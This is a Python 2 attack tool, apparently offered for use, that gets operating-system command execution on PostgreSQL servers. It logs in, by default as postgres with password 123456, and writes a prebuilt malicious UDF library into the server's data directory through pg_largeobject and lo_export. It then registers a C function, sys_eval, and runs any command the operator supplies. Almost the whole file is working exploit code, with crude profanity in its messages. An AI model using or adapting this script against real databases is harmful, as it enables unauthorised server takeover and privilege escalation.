#coding:utf-8
#https://www.postgresql.org/ftp/source/
#Author：T3st0r

import psycopg2,re,sys
import ConfigParser,argparse
import time,os,base64
reload(sys)
sys.setdefaultencoding('utf8')

t=int(time.strftime("%Y%m%d%H%M%S", time.localtime()))
o=""

conn_status=""
def conn_pg():
	global conn
	try:
		conn = psycopg2.connect(database=pgsql_db, 
								user=pgsql_user, 
								password=pgsql_passwd, 
								host=pgsql_host, 
								port=pgsql_port
								)
		conn.set_client_encoding('UTF8')
		conn_status="ok"
	except:
		print("what fucking pgsql connection!!!!")
		conn_status="fail"
	return conn_status

def fuck():
	conn_pg()
	print("Opened database successfully") 
	cur = conn.cursor()
	cur.execute('select version()')
	rows = cur.fetchall()
	tmp1=rows[0][0]
	tmp=re.findall(r"PostgreSQL \d\.\d\..{2}",tmp1)
	ver=tmp[0].replace("PostgreSQL ","")
	cur.execute('show data_directory')
	datadir=cur.fetchall()[0][0]+"/"
	print("datadir: %s"%datadir)
	if not r":/" in datadir:
		if "64" in tmp1:
			arch="64"
		else:
			arch="32"
		o="linux"
		open_file=".so"
		udffile=str(t)+".so"
	else:
		o="windows"
		arch="32"
		open_file=".dll"
		udffile=str(t)+".dll"
	print("pgsql ver: PostgreSQL %s running on %s %s"% (ver,o,arch))
	v1=ver[:3]
	org_file=r"./udf/%s/%s/%s%s"%(o,arch,v1,open_file)
	if os.path.exists(org_file):
		print("OK, We have this version of UDF file: %s"%org_file)
		'''
		此处可用于base64编码在导出ascii的内容到大对象
		tmp1=""
		with open(org_file,"rb") as f:
			with open(org_file+'_bs64.txt',"wb") as bsf:
				base64.encode(f,bsf)
		'''
		with open(org_file,"rb") as f:
			e1=f.read()
			size1=len(e1)
	
		#linux or windows部分udf处理------------------------------------------------
		if o=="linux" or "windows":	
			tmp5=""
			with open(org_file,"rb") as fo:
				for p in range(size1):
					dd=fo.read(1)
					byte=ord(dd)
					tmp4=str(hex(byte)).replace("0x",'')
					if len(tmp4)==1:
						tmp4="0"+tmp4
					tmp5+=tmp4
			#此处是个坑。。。浪费了一天多排错：pg_largeobject每个page必须写满2kb，换成hex即是4kb，4096b，如果不是4096，拼接则会出现null，导致dll不可用。
			tmpdata=[]
			for i in range(len(tmp5)/4096+1):
				tmp1 = tmp5[i*4096:(i+1)*4096]
				tmpdata.append(tmp1)

				
		#通用提权部分。
		try:
			cur.execute("rollback")
			cur.execute("SELECT lo_unlink(9999)")
		except:
			pass
		cur.execute('SELECT lo_create(9999)')
		cur.execute("delete from pg_largeobject where loid=9999")
		for h in range(len(tmpdata)):		
			#if o=="linux":
			cur.execute("insert into pg_largeobject (loid,pageno,data) values(9999, %s, decode('%s', 'hex'));"%(h,tmpdata[h]))#

		#print("UPDATE pg_largeobject SET data=(DECODE((SELECT data FROM test_d), CHR(98)||CHR(97)||CHR(115)||CHR(101)||CHR(54)||CHR(52))) WHERE loid=%s"% int(OID))
		cur.execute("SELECT lo_export(9999, '%s')"% udffile)
		cur.execute("Select lo_unlink(9999)")
		#print("CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '%s', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;"%(datadir+udffile))
		cur.execute("CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '%s', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;"%(datadir+udffile))

		cur.execute("select sys_eval('%s')"%cmd_execute)
		rows2 = cur.fetchall()
		print("'%s' command result: "%cmd_execute)

		for each in rows2:
			print(each[0])
		try:
			cur.execute('DROP FUNCTION sys_eval(text)')
		except:
			pass
		conn.commit()
		conn.close()
	else:
		print("FUCK, We do not have this version of UDF file. ")
	return;
	
if __name__ == "__main__":
	parse = argparse.ArgumentParser(description="fuck_postgres")
	parse.add_argument('-a','--host', type=str, help="pgsql server ip")
	parse.add_argument('-o','--port', type=int, help="pgsql Port",default=5432)
	parse.add_argument('-u', '--user', type=str, help="pgsql UserName",default="postgres")
	parse.add_argument('-p', '--passwd', type=str, help="pgsql password", default='123456')
	parse.add_argument('-d', '--database', type=str, help="pgsql database", default='postgres')
	parse.add_argument('-e', '--execute', type=str, help="command for UDF to execute",default="whoami")
	args = parse.parse_args()
	print("\nFUCK_PostgreSQL By T3st0r\n")
	if len(sys.argv)<4:
		parse.print_help()
	else:
		pgsql_host = args.host
		pgsql_passwd = args.passwd
		pgsql_port = args.port
		pgsql_user = args.user
		pgsql_db = args.database
		cmd_execute = args.execute
		if conn_pg()=='ok':
			fuck()
		else:
			print('What fucking postgres!  bye!')
